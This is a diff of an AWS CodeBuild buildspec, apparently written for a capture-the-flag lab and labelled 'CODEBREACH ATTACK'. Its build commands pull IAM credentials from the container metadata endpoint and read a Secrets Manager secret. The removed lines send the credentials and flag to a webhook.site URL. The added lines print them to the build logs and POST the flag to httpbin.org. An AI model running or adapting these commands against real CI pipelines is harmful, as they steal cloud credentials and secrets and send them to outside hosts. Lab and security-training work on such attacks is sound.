@@ -5,9 +5,12 @@ phases:
     commands:
       - echo "=== CODEBREACH ATTACK ==="
       - CREDS=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
-      - echo "Credentials obtained"
       - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text 2>&1)
-      - echo "Flag obtained"
-      - 'curl -X POST "https://webhook.site/566fcd83-555e-44d7-a8fc-dc7c49559020" -H "Content-Type: text/plain" -d "CREDS=$CREDS" || true'
-      - 'curl -X POST "https://webhook.site/566fcd83-555e-44d7-a8fc-dc7c49559020" -H "Content-Type: text/plain" -d "FLAG=$FLAG" || true'
-      - echo "=== Data exfiltrated ==="
+      - echo "CREDENTIALS_START"
+      - echo "$CREDS"
+      - echo "CREDENTIALS_END"
+      - echo "FLAG_START"
+      - echo "$FLAG"
+      - echo "FLAG_END"
+      - curl -s "https://httpbin.org/post" -X POST -d "flag=$FLAG" | head -20
+      - echo "=== ATTACK COMPLETE ==="
